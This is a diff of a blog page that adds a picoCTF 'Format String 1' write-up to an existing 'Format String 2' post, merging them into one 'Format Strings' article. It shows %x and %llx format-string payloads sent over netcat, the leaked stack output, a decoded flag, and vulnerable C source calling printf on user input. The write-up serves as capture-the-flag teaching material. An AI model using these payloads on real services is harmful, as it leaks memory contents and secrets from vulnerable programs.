@@ -6,23 +6,27 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Writing and understanding a format string payloads">
+    <meta name="description" content="Understanding and exploiting format string vulnerabilities">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Format String 2">
-<meta property="og:url" content="https://rivers.sh/posts/formatstring2/index.html">
+<meta property="og:title" content="Format Strings">
+<meta property="og:url" content="https://rivers.sh/posts/formatstring/index.html">
 <meta property="og:site_name" content="Rivers">
-<meta property="og:description" content="Writing and understanding a format string payloads">
+<meta property="og:description" content="Understanding and exploiting format string vulnerabilities">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rivers.sh/images/formatstring-1/formatstring1.png">
+<meta property="og:image" content="https://rivers.sh/images/formatstring-1/possibleflag.png">
+<meta property="og:image" content="https://rivers.sh/images/formatstring-1/possibleflag2.png">
+<meta property="og:image" content="https://rivers.sh/images/formatstring-1/jumbledflag.png">
 <meta property="og:image" content="https://rivers.sh/images/formatstring-2/formatstring2.png">
 <meta property="og:image" content="https://rivers.sh/images/formatstring-2/cyberchef.png">
 <meta property="article:published_time" content="2024-08-27T04:00:00.000Z">
-<meta property="article:modified_time" content="2025-01-04T09:13:41.866Z">
+<meta property="article:modified_time" content="2025-01-04T09:48:30.626Z">
 <meta property="article:author" content="Rivers">
 <meta property="article:tag" content="Medium">
 <meta property="article:tag" content="Binary Exploitation">
 <meta property="article:tag" content="Format String">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://rivers.sh/images/formatstring-2/formatstring2.png">
+<meta name="twitter:image" content="https://rivers.sh/images/formatstring-1/formatstring1.png">
     
     
       
@@ -42,7 +46,7 @@
       
     
     <!-- title -->
-    <title>Format String 2</title>
+    <title>Format Strings</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
@@ -83,10 +87,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/posts/trickster/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/posts/formatstring2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/posts/formatstring/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/posts/formatstring1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -99,24 +103,24 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/formatstring2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/formatstring2/&text=Format String 2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/formatstring2/&is_video=false&description=Format String 2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Format String 2&body=Check out this article: https://rivers.sh/posts/formatstring2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/formatstring2/&name=Format String 2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/formatstring2/&t=Format String 2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/formatstring/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/formatstring/&text=Format Strings"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/formatstring/&is_video=false&description=Format Strings"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Format Strings&body=Check out this article: https://rivers.sh/posts/formatstring/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/formatstring/&name=Format Strings&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/formatstring/&t=Format Strings"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-vuln-c"><span class="toc-number">2.</span> <span class="toc-text">Understanding vuln.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-sus%E2%80%99s-address"><span class="toc-number">3.</span> <span class="toc-text">Finding sus’s address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Experimenting"><span class="toc-number">4.</span> <span class="toc-text">Experimenting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writing-to-the-stack"><span class="toc-number">5.</span> <span class="toc-text">Writing to the stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bonus-the-automatic-way"><span class="toc-number">6.</span> <span class="toc-text">Bonus: the automatic way</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Format-String-1"><span class="toc-number">1.</span> <span class="toc-text">Format String 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attempts"><span class="toc-number">1.2.</span> <span class="toc-text">Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.3.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Format-String-2"><span class="toc-number">2.</span> <span class="toc-text">Format String 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info-1"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-vuln-c"><span class="toc-number">2.2.</span> <span class="toc-text">Understanding vuln.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-sus%E2%80%99s-address"><span class="toc-number">2.3.</span> <span class="toc-text">Finding sus’s address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Experimenting"><span class="toc-number">2.4.</span> <span class="toc-text">Experimenting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writing-to-the-stack"><span class="toc-number">2.5.</span> <span class="toc-text">Writing to the stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bonus-the-automatic-way"><span class="toc-number">2.6.</span> <span class="toc-text">Bonus: the automatic way</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -129,7 +133,7 @@
   <header>
     
     <h1 class="posttitle p-name" itemprop="name headline">
-        Format String 2
+        Format Strings
     </h1>
 
 
@@ -165,17 +169,40 @@
   </header>
   
   <!-- Display the description -->
-  <div class="post-description">Writing and understanding a format string payloads</div>
+  <div class="post-description">Understanding and exploiting format string vulnerabilities</div>
 
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!</p>
+    <hr>
+<h1 id="Format-String-1"><a href="#Format-String-1" class="headerlink" title="Format String 1"></a>Format String 1</h1><h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>description: <code>Patrick and Sponge Bob were really happy with those orders you made for them, but now they&#39;re curious about the secret menu. Find it, and along the way, maybe you&#39;ll find something else of interest!</code></p>
+<p>Downloads the binary <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c_mimas/82/format-string-1">here</a>.</p>
+<p>Downloads the source <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c_mimas/82/format-string-1.c">here</a>.</p>
+<p>Connect with the challenge instance here:<br><code>nc mimas.picoctf.net &lt;port&gt;</code></p>
+<p>author: Connor Chang</p>
+<p><img src="/images/formatstring-1/formatstring1.png" alt="format string 1"></p>
+<h2 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h2><p>Upon connecting to the netcat listener, we’re prompted: <code>Give me your order and I&#39;ll read it back to you:</code></p>
+<p>Because of the name of the challenge; “<strong>Format String</strong> 1”, we already get a pretty big hint. Just from experience, I know that <code>%x</code> can be used in format string vulnerabilities to either dump or navigate memory stacks. Naturally, this is the route I took.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ &gt; nc mimas.picoctf.net 63183                               INT 18s</span><br><span class="line">Give me your order and I&#x27;ll read it back to you:</span><br><span class="line">%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,</span><br><span class="line">Here&#x27;s your order: 402118,0,6377ea00,0,a64880,a347834,b4da5590,6356fe60,637944d0,1,b4da5660,0,0,6f636970,6d316e34,33317937,3431665f,64303935,7,637968d8,7,74307250,6c797453,9,637a7de9,63578098,637944d0,0,b4da5670,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,454d4100,6e656c6c,4c564c48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+
+<p>After pasting this into <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">Cyberchef</a> with “From Hex” selected, I started to notice what might be a flag.</p>
+<p><img src="/images/formatstring-1/possibleflag.png" alt="possible flag"></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>After inspecting the initial output, I decided to modify my format string to use <code>%llx</code> instead of <code>%x</code>. The <code>ll</code> modifier stands for “long long,” which in C is a data type representing a 64-bit integer. By using <code>%llx</code>, I ensured that each stack read would capture a full 64-bit value, meaning 16 hexadecimal digits would be printed instead of just 8. This is important because the flag or other useful data might be stored in a location that requires reading all 16 bytes (instead of 8) to be fully captured.</p>
+<p>After using this adjustment, with commas <code>,</code> to clearly separate each stack, I got a different result:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ &gt; nc mimas.picoctf.net 63183                            INT 1m 53s</span><br><span class="line">Give me your order and I&#x27;ll read it back to you:</span><br><span class="line">%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,</span><br><span class="line">Here&#x27;s your order: 402118,0,7aaeacfeba00,0,1c1f880,a347834,7ffd67ec6cc0,7aaeacddce60,7aaead0014d0,1,7ffd67ec6d90,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,35365f673431665f,7d313464303935,7,7aaead0038d8,2300000007,206e693374307250,a336c797453,9,7aaead014de9,7aaeacde5098,7aaead0014d0,0,7ffd67ec6da0,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+
+<p>I decided to put these hex values through Cyberchef again, and saw what’s definitely an encoded flag:</p>
+<p><img src="/images/formatstring-1/possibleflag2.png" alt="possible flag"></p>
+<p>After removing the null values, I was left with this:</p>
+<p><img src="/images/formatstring-1/jumbledflag.png" alt="jumbled flag"></p>
+<p>From here, the challenge is mostly nonsensical decoding, and it gets really bad (there is a reason it’s &lt; 50% positive reviews). I went through it anyways, but I probably won’t write how I decoded&#x2F;solved it, it’s not really “hacking” and serves no purpose for this challenge.</p>
+<p>flag: <code>picoCTF&#123;4n1m41_57y13_4x4_f14g_65590d41&#125;</code></p>
+<hr>
+<h1 id="Format-String-2"><a href="#Format-String-2" class="headerlink" title="Format String 2"></a>Format String 2</h1><h2 id="Challenge-Info-1"><a href="#Challenge-Info-1" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!</p>
 <p>Downloads the binary <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c_rhea/26/vuln">here</a>.</p>
 <p>Downloads the source <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c_rhea/26/vuln.c">here</a>.</p>
 <p>Additional details will be available after launching your challenge instance.</p>
 <p><img src="/images/formatstring-2/formatstring2.png" alt="format string 2"></p>
-<p>hint 1: pwntools are very useful for this problem!</p>
 <p>author: SKRUBLAWD</p>
 <h2 id="Understanding-vuln-c"><a href="#Understanding-vuln-c" class="headerlink" title="Understanding vuln.c"></a>Understanding vuln.c</h2><p>The code for your convenience:</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sus = <span class="number">0x21737573</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%1024s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your input: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sus == <span class="number">0x67616c66</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I have NO clue how you did that, you must be a wizard. Here you go...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in the flag</span></span><br><span class="line">    FILE *fd = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fgets</span>(flag, <span class="number">64</span>, fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sus = 0x%x\n&quot;</span>, sus);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can do better!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -193,7 +220,7 @@
 </ol>
 <p>So all we need to do is change the variable <code>sus</code> to equal <code>0x67616c66</code></p>
 <h2 id="Finding-sus’s-address"><a href="#Finding-sus’s-address" class="headerlink" title="Finding sus’s address"></a>Finding sus’s address</h2><p>Before changing the <code>sus</code> variable, we need to understand where it’s being stored. To find that, I decided to use obj, but realistically any decompiler can work. The command I ran was:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/Downloadss &gt; objdump -t ./vuln | grep sus</span><br><span class="line">0000000000404060 g     O .data	0000000000000004              sus</span><br><span class="line"></span><br><span class="line">~/Downloadss &gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/Downloads &gt; objdump -t ./vuln | grep sus</span><br><span class="line">0000000000404060 g     O .data	0000000000000004              sus</span><br><span class="line"></span><br><span class="line">~/Downloads &gt;</span><br></pre></td></tr></table></figure>
 <p>From this, we know that the memory address where <code>sus</code> is being stored is <code>0x404060</code> (the <code>0x</code> is there because all memory addresses start with this).</p>
 <p>From here, I recalled the challenge’s hint- that pwntools would be crucial to beating this.</p>
 <h2 id="Experimenting"><a href="#Experimenting" class="headerlink" title="Experimenting"></a>Experimenting</h2><p>Firstly, we can try to read stack values:</p>
@@ -268,23 +295,23 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-vuln-c"><span class="toc-number">2.</span> <span class="toc-text">Understanding vuln.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-sus%E2%80%99s-address"><span class="toc-number">3.</span> <span class="toc-text">Finding sus’s address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Experimenting"><span class="toc-number">4.</span> <span class="toc-text">Experimenting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writing-to-the-stack"><span class="toc-number">5.</span> <span class="toc-text">Writing to the stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bonus-the-automatic-way"><span class="toc-number">6.</span> <span class="toc-text">Bonus: the automatic way</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Format-String-1"><span class="toc-number">1.</span> <span class="toc-text">Format String 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attempts"><span class="toc-number">1.2.</span> <span class="toc-text">Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.3.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Format-String-2"><span class="toc-number">2.</span> <span class="toc-text">Format String 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info-1"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-vuln-c"><span class="toc-number">2.2.</span> <span class="toc-text">Understanding vuln.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-sus%E2%80%99s-address"><span class="toc-number">2.3.</span> <span class="toc-text">Finding sus’s address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Experimenting"><span class="toc-number">2.4.</span> <span class="toc-text">Experimenting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writing-to-the-stack"><span class="toc-number">2.5.</span> <span class="toc-text">Writing to the stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bonus-the-automatic-way"><span class="toc-number">2.6.</span> <span class="toc-text">Bonus: the automatic way</span></a></li></ol></li></ol>
       </div>
     
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/formatstring2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/formatstring2/&text=Format String 2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/formatstring2/&is_video=false&description=Format String 2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Format String 2&body=Check out this article: https://rivers.sh/posts/formatstring2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/formatstring2/&title=Format String 2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/formatstring2/&name=Format String 2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/formatstring2/&t=Format String 2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/formatstring/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/formatstring/&text=Format Strings"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/formatstring/&is_video=false&description=Format Strings"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Format Strings&body=Check out this article: https://rivers.sh/posts/formatstring/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
